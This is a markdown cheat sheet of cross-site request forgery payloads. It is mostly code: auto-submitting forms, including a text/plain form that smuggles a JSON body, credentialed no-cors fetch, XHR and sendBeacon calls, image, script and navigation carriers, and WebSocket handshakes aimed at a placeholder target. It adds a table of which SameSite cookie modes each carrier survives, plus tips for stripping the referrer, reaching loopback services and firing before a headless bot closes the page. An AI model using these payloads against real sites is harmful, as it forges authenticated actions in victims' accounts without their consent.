# Delivery shapes — the cross-origin request carriers, complete

Every HTML/JS construct that fires a cross-origin request, grouped
by method, content-type, and which SameSite it survives.

---

## Forms — the navigation carriers

```html
<!-- POST urlencoded — the default -->
<form id=f action="https://t/x" method=POST><input name=a value=1></form>
<script>f.submit()</script>

<!-- POST text/plain — the JSON carrier -->
<form id=f action="https://t/x" method=POST enctype=text/plain>
<input name='{"a":"' value='x","i":"'}'></form><script>f.submit()</script>

<!-- POST multipart — file/field -->
<form id=f action="https://t/x" method=POST enctype=multipart/form-data>
<input name=f type=file><input name=cfg value='{"a":1}'></form>
<script>f.submit()</script>

<!-- GET — the Lax-open top-nav -->
<form id=f action="https://t/x" method=GET><input name=a value=1></form>
<script>f.submit()</script>

<!-- iframe-targeted — stays on page -->
<iframe name=w style=display:none></iframe>
<form target=w action="https://t/x" method=POST><input name=a value=1></form>
<script>document.forms[0].submit()</script>
```

A form is a NAVIGATION — `Sec-Fetch-Mode: navigate` — and the only
carrier that ships a body via a top-level action. Under `SameSite=Lax`
only the GET form (a top-level nav) attaches the cookie.

## Fetch/XHR — the programmatic carriers

```js
// no-cors + credentials — the fire-and-forget write
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"a":1,"i":"="}'})

// xhr — same rules
var x=new XMLHttpRequest();x.open('POST','https://t/x',true);
x.withCredentials=true;x.setRequestHeader('Content-Type','text/plain');
x.send('{"a":1,"i":"="}');
```

`Sec-Fetch-Mode: no-cors` — the response is opaque. Only safelisted
content-types settable.

## Beacon — the unload-safe POST

```js
navigator.sendBeacon('https://t/x',new Blob(['{"a":1,"i":"="}'],{type:'text/plain'}))
navigator.sendBeacon('https://t/x','a=1')
navigator.sendBeacon('https://t/x',new URLSearchParams('a=1'))
```

Fires even on page-unload — the reliable carrier when the page
navigates away.

## Sub-resource GET carriers — the img/script set

```html
<img src="https://t/x?a=1">
<script src="https://t/x?a=1"></script>
<link rel=stylesheet href="https://t/x?a=1">
<iframe src="https://t/x?a=1"></iframe>
<video src="https://t/x?a=1"></video><audio src="https://t/x?a=1"></audio>
<embed src="https://t/x?a=1"><object data="https://t/x?a=1"></object>
<input type=image src="https://t/x?a=1">
<svg><image href="https://t/x?a=1"/></svg>
<iframe srcdoc="<img src='https://t/x?a=1'>"></iframe>
```

GET-only, sub-resource (`Sec-Fetch-Mode: no-cors`, `Sec-Fetch-Dest:
image|script|iframe|...`) — NOT top-navs — SameSite=Lax blocks the
cookie. Only SameSite=None or missing-on-old-bot attaches.

## Top-level GET navs — the Lax-safe set

```html
<a href="https://t/x?a=1">x</a>
<script>location='https://t/x?a=1'</script>
<script>window.open('https://t/x?a=1')</script>
<meta http-equiv=refresh content="0;url=https://t/x?a=1">
```

The ONLY carriers that attach a `SameSite=Lax` cookie — a top-level
GET navigation is the Lax exception. All GET-only.

## EventSource / WebSocket — the stream carriers

```js
new EventSource('https://t/stream?a=1')   // GET stream
var ws=new WebSocket('wss://t/ws');        // ws handshake carries cookies
ws.onopen=()=>ws.send(JSON.stringify({op:'x'}))
```

## The referrer-strippers / opaque origins

```html
<meta name=referrer content=no-referrer>           <!-- no Referer -->
<script>location='data:text/html,<form ...>...</form>'</script>
<!-- a data: page's request sends Origin: null, no Referer -->
```

## The carrier matrix — SameSite x method x content-type

| Carrier | Method | Content-type | Lax? | None? | Strict? |
|---|---|---|---|---|---|
| form GET | GET | query | YES | yes | no |
| form POST urlencoded | POST | urlencoded | no | yes | no |
| form POST text/plain | POST | text/plain | no | yes | no |
| form POST multipart | POST | multipart | no | yes | no |
| fetch no-cors | POST/GET | safelisted | no | yes | no |
| xhr | POST/GET | safelisted | no | yes | no |
| sendBeacon | POST | blob-type | no | yes | no |
| img/script/link | GET | query | no | yes | no |
| a/meta/location/open | GET | query | YES | yes | no |
| iframe src | GET | query | no | yes | no |
| EventSource | GET | query | no | yes | no |
| WebSocket | ws | message | varies | varies | no |

Under `SameSite=None;Secure` every carrier attaches. Under `Lax`
only the top-nav GET rows. Under `Strict` none.

## The PNA/mixed-content constraints

```text
- a fetch to loopback (private-network) → PNA preflight; a form nav
  isn't PNA-gated the same way → prefer a form for loopback
- an https page → http form → mixed-content block → use http/data:
```

## The auto-fire wrappers — no click needed

```html
<body onload="document.forms[0].submit()">
<img src=x onerror="document.forms[0].submit()">
<script>document.forms[0].submit()</script>
<script>location='https://t/x?a=1'</script>
<meta http-equiv=refresh content="0;url=https://t/x?a=1">
<iframe srcdoc="...auto-submit..."></iframe>
```

## The "the write must fire before the bot closes" rule

```text
put the form.submit() or the write FIRST in the script — a bot that
closes the page fast still fires a synchronous nav. an async fetch
may be cut off; a form nav commits.
```
